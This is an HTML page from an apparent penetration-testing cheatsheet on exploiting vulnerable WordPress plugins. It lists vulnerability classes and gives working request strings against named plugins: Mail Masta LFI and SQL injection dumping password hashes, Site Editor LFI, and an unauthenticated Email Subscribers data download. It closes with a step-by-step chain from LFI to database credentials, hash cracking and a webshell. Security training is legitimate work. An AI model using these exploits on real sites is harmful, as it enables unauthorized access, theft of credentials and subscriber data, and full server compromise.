@@ -1,0 +1,307 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Vulnerable Plugins · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › WordPress</nav><h1>Vulnerable Plugins</h1><p class="cx-lede">The plugin ecosystem as the dominant WordPress attack surface - class-level patterns (unauthenticated LFI, file download, SQLi, file upload, auth bypass), canonical examples (Mail Masta, Site Editor, Email Subscribers), and the WPScan-to-exploit workflow.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190, T1505</span><span class="cx-tag">D3FEND D3-AH</span><span class="cx-tag">IMPACT RCE, FileRead, FileWrite, AuthBypass, DataExfil</span><span class="cx-tag">OWASP A01, A03, A05, A06</span></div><article class="cx-body"><h2 id="tldr">TL;DR</h2>
+<p>WordPress plugins are PHP files in <code>wp-content/plugins/&lt;plugin&gt;/</code> that can be reached directly by HTTP. Many plugins expose AJAX handlers, REST API routes, or "direct script" entry points that take user input and don't properly validate it. The same vulnerability classes recur over and over across the ecosystem:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code># 1. Unauthenticated LFI - read arbitrary files
+curl &#x27;http://target/wp-content/plugins/PLUGIN/path/to/script.php?file=/etc/passwd&#x27;
+
+# 2. Unauthenticated file download - pull files via admin AJAX
+curl &#x27;http://target/wp-admin/admin.php?page=PLUGIN_PAGE&amp;report=users&amp;status=all&#x27;
+
+# 3. Unauthenticated SQL injection - read DB content
+curl &quot;http://target/wp-content/plugins/PLUGIN/script.php?id=1&#x27; UNION SELECT 1--&quot;
+
+# 4. Authenticated arbitrary file upload - drop a webshell
+# Submit to plugin&#x27;s upload handler with PHP content + bypassed extension
+
+# 5. Authentication bypass - log in without credentials
+# Hit a specific endpoint that doesn&#x27;t enforce authorization</code></pre></figure>
+<p>Success indicator: a single HTTP request to a plugin endpoint returns either file content (<code>root:x:0:0:...</code>), database content, or a 200-OK on what should have been an authenticated endpoint.</p>
+<h2 id="why-plugins-are-the-dominant-attack-surface">Why plugins are the dominant attack surface</h2>
+<p>A few realities:</p>
+<ul>
+<li><strong>There are tens of thousands of plugins.</strong> The WordPress.org repository hosts ~60k. Plus paid plugins on CodeCanyon and elsewhere. No single defender can audit them all.</li>
+<li><strong>Most plugins are written by one or two people.</strong> Many are hobby projects or "scratch my own itch" tools. Security review is rare; secure-coding practices are inconsistent.</li>
+<li><strong>Plugins are PHP files reachable by direct HTTP request.</strong> WordPress doesn't gate plugin file access through the WP routing layer - Apache or nginx serves <code>/wp-content/plugins/foo/bar.php</code> directly, and that PHP file runs whatever logic it contains.</li>
+<li><strong>Plugin scripts often skip the WordPress bootstrap.</strong> A plugin's helper PHP file may run without ever calling <code>wp-load.php</code>, which means WordPress's authentication and authorization checks don't fire. The script is on its own to validate the request.</li>
+<li><strong>Plugin AJAX handlers commonly forget nonces or permission checks.</strong> A plugin registers <code>wp_ajax_my_action</code> and <code>wp_ajax_nopriv_my_action</code> (the unauthenticated version) and forgets to verify the user's role inside the handler.</li>
+</ul>
+<p>The cumulative effect: every WordPress site running third-party plugins is statistically likely to have at least one with an unauthenticated finding.</p>
+<h2 id="the-class-level-pattern-catalog">The class-level pattern catalog</h2>
+<h3 id="1-unauthenticated-local-file-inclusion">1. Unauthenticated Local File Inclusion</h3>
+<p>Pattern: a plugin script takes a file path from <code>$_GET</code> and passes it to <code>include()</code>, <code>require()</code>, <code>file_get_contents()</code>, <code>fopen()</code>, or <code>readfile()</code> without validation.</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// In some plugin&#x27;s script.php
+&lt;?php
+$file = $_GET[&#x27;file&#x27;];
+include($file);   // unfiltered → LFI
+?&gt;</code></pre></figure>
+<p>Exploitation:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/wp-content/plugins/PLUGIN/script.php?file=/etc/passwd
+http://target/wp-content/plugins/PLUGIN/script.php?file=../../../../etc/passwd</code></pre></figure>
+<p>Read <code>wp-config.php</code> for DB credentials:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/wp-content/plugins/PLUGIN/script.php?file=/var/www/html/wp-config.php</code></pre></figure>
+<p>For deeper coverage of LFI techniques (PHP filters, log poisoning, RCE chains), see the <a href="../../lfi/index.html">LFI cluster</a>. All those techniques apply directly to LFI in plugin code.</p>
+<h4 id="canonical-example-mail-masta-10">Canonical example: Mail Masta 1.0</h4>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd</code></pre></figure>
+<p>Source code:</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// inc/campaign/count_of_send.php
+&lt;?php
+$pl = $_GET[&#x27;pl&#x27;];
+include($pl);
+?&gt;</code></pre></figure>
+<p>That's the entire vulnerability. Three lines of unguarded PHP, accessible without authentication, reachable from the internet.</p>
+<h4 id="canonical-example-site-editor-111">Canonical example: Site Editor 1.1.1</h4>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd</code></pre></figure>
+<p>Similar pattern, different plugin, same outcome.</p>
+<h3 id="2-unauthenticated-arbitrary-file-download">2. Unauthenticated arbitrary file download</h3>
+<p>Pattern: a plugin exposes an admin-page handler that calls <code>header('Content-Disposition: attachment')</code> and reads a file path from a parameter - without verifying the user is logged in.</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// In the plugin&#x27;s admin handler
+&lt;?php
+$report = $_GET[&#x27;report&#x27;];
+$path = &quot;/var/www/html/wp-content/plugins/PLUGIN/reports/{$report}.csv&quot;;
+header(&#x27;Content-Disposition: attachment; filename=&#x27; . basename($path));
+readfile($path);
+?&gt;</code></pre></figure>
+<p>When the handler is reachable at <code>wp-admin/admin.php?page=PLUGIN_PAGE</code>, the URL itself looks like an admin URL, but the script doesn't enforce admin role.</p>
+<h4 id="canonical-example-email-subscribers-newsletters-422">Canonical example: Email Subscribers &amp; Newsletters 4.2.2</h4>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/wp-admin/admin.php?page=download_report&amp;report=users&amp;status=all</code></pre></figure>
+<p>Even without being logged in, this URL downloads a CSV of all subscriber records. The plugin's handler skipped the <code>current_user_can('manage_options')</code> check.</p>
+<p>The file you get is application data (subscriber emails, names, sometimes more) - useful for the engagement's evidence collection or as a stepping stone (each subscriber email is a candidate for password spraying against <code>wp-login.php</code>).</p>
+<h3 id="3-unauthenticated-sql-injection">3. Unauthenticated SQL injection</h3>
+<p>Pattern: a plugin AJAX handler or direct-script entry point takes a parameter and concatenates it into a SQL query without using <code>$wpdb-&gt;prepare()</code>.</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// Vulnerable pattern in a plugin
+$campaign_id = $_GET[&#x27;filter_id&#x27;];
+$results = $wpdb-&gt;get_results(
+    &quot;SELECT * FROM wp_subscribers WHERE campaign_id = &quot; . $campaign_id
+);</code></pre></figure>
+<p>Exploitation follows standard SQLi rules - see the <a href="../../sqli/index.html">SQL Injection cluster</a>. WordPress's <code>$wpdb</code> returns MySQL results, so the <a href="../../../network/services/mysql/index.html">MySQL service page</a> also applies once you've found the entry point.</p>
+<h4 id="canonical-example-mail-masta-10-multiple-sqli">Canonical example: Mail Masta 1.0 (multiple SQLi)</h4>
+<p>Same plugin as the LFI above. Vulnerable parameters include <code>filter_id</code> on several handlers. Once SQLi is confirmed:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>http://target/wp-content/plugins/mail-masta/inc/lists/csvexport.php?list_id=1 UNION SELECT user_login, user_pass FROM wp_users--</code></pre></figure>
+<p>Returns username + hashed-password pairs from <code>wp_users</code>. Crack with <code>hashcat -m 400</code> (WordPress phpass mode).</p>
+<h3 id="4-authenticated-arbitrary-file-upload">4. Authenticated arbitrary file upload</h3>
+<p>Pattern: a plugin's upload handler accepts files from any authenticated user (sometimes any user above Subscriber, sometimes any logged-in user including subscribers) and writes them to a web-served directory without validating the file type or extension.</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// Vulnerable upload handler
+if (!is_user_logged_in()) {
+    wp_die(&#x27;Login required&#x27;);
+}
+
+$file = $_FILES[&#x27;upload&#x27;];
+$dest = WP_CONTENT_DIR . &#x27;/uploads/&#x27; . $file[&#x27;name&#x27;];
+move_uploaded_file($file[&#x27;tmp_name&#x27;], $dest);
+echo &quot;Uploaded to: /wp-content/uploads/&quot; . $file[&#x27;name&#x27;];</code></pre></figure>
+<p>The check <code>is_user_logged_in()</code> is satisfied by Subscriber-level access. The script doesn't validate the extension. Upload <code>shell.php</code>, get it at <code>/wp-content/uploads/shell.php</code>, execute.</p>
+<p>The <a href="../../uploads/index.html">file upload cluster</a> covers extension bypass and shell selection in detail.</p>
+<h3 id="5-authentication-bypass">5. Authentication bypass</h3>
+<p>Pattern: a plugin adds an authentication route or login flow that has a logic flaw - accepting cryptographically weak tokens, accepting predictable session IDs, accepting an empty password for specific users, or skipping the password check entirely under certain conditions.</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">// Plugin&#x27;s &quot;OAuth callback&quot; handler - actual bug pattern
+$user_id = $_GET[&#x27;user_id&#x27;];   // attacker controls this
+$user = get_userdata($user_id);
+wp_set_current_user($user-&gt;ID);
+wp_set_auth_cookie($user-&gt;ID);  // login as that user
+wp_redirect(admin_url());</code></pre></figure>
+<p>Exploitation: visit <code>/wp-login.php?action=oauth_callback&amp;user_id=1</code> → logged in as user 1 (the admin).</p>
+<p>Less common than the other classes, but historically prevalent - the <a href="https://wpscan.com/plugins">WordPress Plugin Vulnerabilities list</a> tracks several auth-bypass CVEs per year.</p>
+<h3 id="6-remote-code-execution">6. Remote Code Execution</h3>
+<p>Less common as a direct primitive (RCE in plugins is rare; usually you chain LFI/upload to RCE) but it happens. Patterns:</p>
+<ul>
+<li>Plugin calls <code>eval()</code> on user input</li>
+<li>Plugin uses <code>system()</code> / <code>exec()</code> / <code>shell_exec()</code> with attacker-controlled arguments</li>
+<li>Plugin deserializes untrusted data (<code>unserialize($_GET[...])</code>) and a class with a magic method exists in the WordPress code base</li>
+</ul>
+<p>When this is the pattern, the writeup typically titles the CVE "Unauthenticated RCE" directly. Treat it as the highest-priority finding.</p>
+<h3 id="7-ssrf">7. SSRF</h3>
+<p>Pattern: a plugin makes an outbound HTTP request to a URL from a parameter.</p>
+<figure class="cx-code"><figcaption>php</figcaption><pre><code class="language-php">$url = $_GET[&#x27;url&#x27;];
+$content = wp_remote_get($url);
+echo $content[&#x27;body&#x27;];</code></pre></figure>
+<p>Reachable from external attacker, the plugin becomes an outbound proxy - internal-network probe primitive. See the <a href="../../server-side/ssrf/index.html">SSRF cluster</a> for the full mechanics.</p>
+<h3 id="8-stored-reflected-xss">8. Stored / Reflected XSS</h3>
+<p>Pattern: a plugin renders user input in HTML without escaping. Less interesting than the server-side vulnerabilities for our purposes, but XSS in the admin dashboard can be chained to admin actions:</p>
+<ul>
+<li>Admin visits a comment containing your stored XSS</li>
+<li>Your script makes authenticated requests on the admin's behalf</li>
+<li>The script creates a new admin user (via <code>/wp-admin/users.php?action=add-new-user</code>) or modifies a theme file</li>
+<li>You log in as the new admin</li>
+</ul>
+<p>This is "admin session-rider" RCE - slow, social-engineering-dependent, but effective when the admin is active.</p>
+<h2 id="the-discovery-workflow">The discovery workflow</h2>
+<p>A typical path from "fresh target" to "exploited plugin":</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>1. Enumerate plugins         (see plugin-theme-enum/)
+   → list of &lt;plugin&gt;:&lt;version&gt; pairs
+
+2. Cross-reference each pair against:
+   - WPScan plugin vulnerability database (with API token)
+   - https://wpscan.com/plugins
+   - https://www.exploit-db.com/ (search by plugin name)
+   - GitHub (search for the plugin name + &quot;CVE&quot; or &quot;exploit&quot;)
+   - Twitter/X for recent disclosures
+   - The plugin&#x27;s own changelog (sometimes admits &quot;fixed security issue&quot; without CVE)
+
+3. For each match:
+   - Read the PoC
+   - Determine prerequisites (auth required? specific configuration?)
+   - Test against the target
+
+4. Categorize findings by severity:
+   - Unauthenticated RCE / file upload - top priority
+   - Unauthenticated LFI - high (read wp-config.php for DB creds)
+   - Authenticated RCE / file upload - medium (need creds first)
+   - SQLi / auth-bypass - high
+   - XSS / CSRF - lower unless chainable</code></pre></figure>
+<h3 id="manual-cross-reference-example">Manual cross-reference example</h3>
+<p>After enumeration finds <code>mail-masta 1.0</code>:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># WPScan database query
+curl -s &quot;https://wpscan.com/api/v3/plugins/mail-masta&quot; \
+     -H &quot;Authorization: Token token=YOUR_API_TOKEN&quot; | jq
+
+# Exploit-DB search
+searchsploit mail masta
+# Output: Mail Masta 1.0 - Unauthenticated Local File Inclusion (40290.txt)
+#         Mail Masta 1.0 - Multiple SQL Injection
+
+# Read the exploit
+searchsploit -m 40290
+cat 40290.txt</code></pre></figure>
+<p>Result: the exploit document gives you the exact URL to hit and the payload structure. Test it.</p>
+<h3 id="wpscan-automated-cross-reference">WPScan automated cross-reference</h3>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell">wpscan --url http://target --enumerate ap --api-token YOUR_API_TOKEN</code></pre></figure>
+<p>The <code>--api-token</code> flag enables vulnerability lookups inline. WPScan's report annotates each detected plugin with known CVEs:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>[+] mail-masta
+ | Location: http://target/wp-content/plugins/mail-masta/
+ | Latest Version: 1.0 (up to date)
+ | Found By: Urls In Homepage (Passive Detection)
+ | [!] 2 vulnerabilities identified:
+ |
+ | [!] Title: Mail Masta 1.0 - Unauthenticated Local File Inclusion (LFI)
+ |      - https://www.exploit-db.com/exploits/40290/
+ | [!] Title: Mail Masta 1.0 - Multiple SQL Injection
+ |      - https://wpscan.com/vulnerabilities/8740</code></pre></figure>
+<p>The link in each vuln points to the PoC. Walk down the list, test each, document findings.</p>
+<h2 id="a-worked-example-mail-masta-lfi-to-rce-chain">A worked example: Mail Masta LFI to RCE chain</h2>
+<p>End-to-end chain on a target running Mail Masta 1.0:</p>
+<figure class="cx-code"><figcaption>shell</figcaption><pre><code class="language-shell"># 1. Confirm the LFI
+$ curl &#x27;http://target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd&#x27;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+...
+
+# 2. Read wp-config.php to grab DB credentials
+$ curl &#x27;http://target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/wp-config.php&#x27;
+# returns the file&#x27;s contents - sometimes via php://filter base64 wrapper if the include
+# interprets PHP rather than reads raw, see /codex/web/lfi/php-filters/
+$ curl &#x27;http://target/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wp-config.php&#x27;
+# Returns base64-encoded source
+# Decode and read DB_USER, DB_PASSWORD, DB_HOST
+
+# 3. Connect to MySQL with the recovered credentials
+$ mysql -h DB_HOST -u DB_USER -p
+mysql&gt; use DB_NAME;
+mysql&gt; SELECT user_login, user_pass FROM wp_users;
+# Returns username + phpass-hashed passwords
+
+# 4. Crack the admin&#x27;s password offline
+$ hashcat -m 400 wp_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# 5. Log into wp-admin with the cracked credentials
+# 6. Theme Editor → 404.php → webshell - see admin-to-RCE chain</code></pre></figure>
+<p>That's "single unauthenticated request → full server compromise" via a chain that doesn't ever require brute-forcing.</p>
+<h2 id="defense-from-the-operators-perspective">Defense from the operator's perspective</h2>
+<p>When you're reporting findings:</p>
+<ul>
+<li>A vulnerable plugin is a finding even if you didn't successfully exploit it. The version is the evidence.</li>
+<li>Note whether the plugin was active or deactivated. Defenders sometimes argue "we deactivated it, it doesn't count" - that's wrong (see <a href="../plugin-theme-enum/index.html">plugin enum</a>) and the report should note that direct file access bypasses deactivation.</li>
+<li>Recommend deletion, not deactivation, of vulnerable unused plugins.</li>
+</ul>
+<h2 id="quick-reference">Quick reference</h2>
+<table>
+<thead>
+<tr>
+<th>Class</th>
+<th>Primitive</th>
+<th>Where you act</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unauth LFI</td>
+<td>Read any file the WP user can read</td>
+<td><code>wp-content/plugins/PLUGIN/&lt;vulnerable-script&gt;.php?param=PATH</code></td>
+</tr>
+<tr>
+<td>Unauth file download</td>
+<td>Download a specific file via plugin's admin handler</td>
+<td><code>wp-admin/admin.php?page=PLUGIN_PAGE&amp;report=...</code></td>
+</tr>
+<tr>
+<td>Unauth SQLi</td>
+<td>Query the DB</td>
+<td>Plugin's AJAX handler or direct script accepting an ID/filter</td>
+</tr>
+<tr>
+<td>Authenticated upload</td>
+<td>Drop a webshell</td>
+<td>Plugin's upload form / endpoint</td>
+</tr>
+<tr>
+<td>Auth bypass</td>
+<td>Skip login entirely</td>
+<td>Plugin-registered route with broken authz</td>
+</tr>
+<tr>
+<td>Unauth RCE</td>
+<td>Direct code execution</td>
+<td>Eval/system call in plugin code</td>
+</tr>
+<tr>
+<td>SSRF</td>
+<td>Outbound HTTP from plugin</td>
+<td>Plugin URL-fetch handler</td>
+</tr>
+<tr>
+<td>Stored XSS in admin</td>
+<td>Admin's browser executes your script</td>
+<td>Comments, post meta, plugin settings</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th>Task</th>
+<th>Tool / Source</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Plugin enumeration</td>
+<td>See <a href="../plugin-theme-enum/index.html">plugin-theme-enum</a></td>
+</tr>
+<tr>
+<td>Vuln lookup (API)</td>
+<td><code>curl https://wpscan.com/api/v3/plugins/&lt;plugin&gt; -H 'Authorization: Token token=...'</code></td>
+</tr>
+<tr>
+<td>Vuln lookup (manual)</td>
+<td>https://wpscan.com/plugins, https://www.exploit-db.com/, Google "CVE plugin NAME"</td>
+</tr>
+<tr>
+<td>Automated scan + vuln cross-ref</td>
+<td><code>wpscan --url URL --enumerate ap --api-token TOKEN</code></td>
+</tr>
+<tr>
+<td>Local exploit search</td>
+<td><code>searchsploit &lt;plugin-name&gt;</code></td>
+</tr>
+<tr>
+<td>Download exploit PoC</td>
+<td><code>searchsploit -m &lt;id&gt;</code></td>
+</tr>
+</tbody>
+</table></article><nav class="cx-pager"><a class="cx-prev" href="../login-bruteforce/index.html">Previous: Login Brute-Force</a><a class="cx-next" href="../admin-to-rce/index.html">Next: Admin to RCE</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
